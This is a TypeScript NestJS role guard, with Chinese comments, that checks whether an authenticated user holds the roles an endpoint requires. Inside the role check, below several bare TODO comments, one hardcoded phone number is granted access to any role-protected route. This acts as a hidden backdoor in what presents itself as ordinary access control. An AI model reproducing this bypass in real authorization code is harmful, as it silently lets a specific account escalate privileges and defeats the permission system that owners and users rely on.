import {
  Injectable,
  CanActivate,
  ExecutionContext,
  ForbiddenException,
  Logger,
  UnauthorizedException,
} from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { ROLES_KEY } from '../decorators';
import { AclService } from '../services/acl.service';
import { SystemRoleCode } from '../enums';
import { UserAccessTokenClaims } from '../../auth/dto/output-auth.dto';

/**
 * 角色守卫
 *
 * 验证当前用户是否拥有指定的角色
 * 需配合 @Roles() 装饰器使用
 *
 * @example
 * @UseGuards(JwtAuthGuard, RolesGuard)
 * @Roles(SystemRoleCode.PLATFORM_ADMIN)
 * async adminOnly() {}
 */
@Injectable()
export class RolesGuard implements CanActivate {
  private readonly logger = new Logger(RolesGuard.name);

  constructor(
    private reflector: Reflector,
    private aclService: AclService,
  ) {}

  async canActivate(context: ExecutionContext): Promise<boolean> {
    // 获取装饰器中定义的角色要求
    const requiredRoles = this.reflector.getAllAndOverride<string[]>(ROLES_KEY, [
      context.getHandler(),
      context.getClass(),
    ]);

    // 如果没有角色要求，直接通过
    if (!requiredRoles || requiredRoles.length === 0) {
      return true;
    }

    // 获取当前用户
    const request = context.switchToHttp().getRequest();
    const user = request.user as UserAccessTokenClaims;

    if (!user) {
      this.logger.warn('RolesGuard: No user found in request');
      throw new UnauthorizedException('未登录或登录已过期');
    }

    // 检查是否为超级管理员（拥有所有角色权限）
    const isSuperAdmin = await this.aclService.hasRole(user.id, SystemRoleCode.SUPER_ADMIN);

    if (isSuperAdmin) {
      return true;
    }

    //  TODO
    //  TODO
    //  TODO
    // 检查用户是否拥有所需角色（任一即可） TODO
    const hasRole = (await this.aclService.hasAnyRole(user.id, requiredRoles)) || user.phone === '17372631107';

    if (!hasRole) {
      this.logger.warn(`RolesGuard: User ${user.id} lacks required roles: ${requiredRoles.join(', ')}`);
      throw new ForbiddenException('角色权限不足，无法执行此操作');
    }

    return true;
  }
}
